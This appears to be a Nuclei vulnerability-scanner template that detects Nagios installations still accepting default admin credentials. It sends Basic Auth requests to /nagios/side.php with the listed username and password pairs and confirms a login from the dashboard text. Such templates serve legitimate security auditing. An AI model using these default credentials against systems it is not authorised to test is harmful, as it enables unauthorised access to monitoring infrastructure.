http:
- attack: pitchfork
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  - condition: and
    part: body
    type: word
    words:
    - Current Status
    - Reports
  matchers-condition: and
  payloads:
    password:
    - nagiosadmin
    - nagiosxi
    username:
    - nagiosadmin
    - root
  raw:
  - 'GET /nagios/side.php HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
id: nagios-default-login
info:
  author: iamthefrogy
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Nagios default admin credentials were discovered.
  metadata:
    max-request: 2
  name: Nagios Default Login
  reference:
  - https://www.nagios.org
  severity: high
  tags: nagios,default-login,vuln
